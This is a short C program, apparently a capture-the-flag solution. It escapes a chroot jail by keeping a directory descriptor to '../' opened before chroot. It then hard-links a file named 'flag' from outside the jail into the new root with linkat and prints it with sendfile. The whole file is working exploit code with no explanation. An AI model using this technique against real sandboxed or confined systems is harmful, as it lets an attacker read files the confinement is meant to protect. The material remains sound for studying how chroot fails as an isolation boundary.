#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

void init(){
    chroot(".");
}
int main(){
    //init();
    int fd=open("../",O_RDONLY|O_NOFOLLOW);
    init();
    linkat(fd,"flag",0,"/lmao",0);
    int fd1=open("lmao",0);
    sendfile(1,fd1,0,10);
}
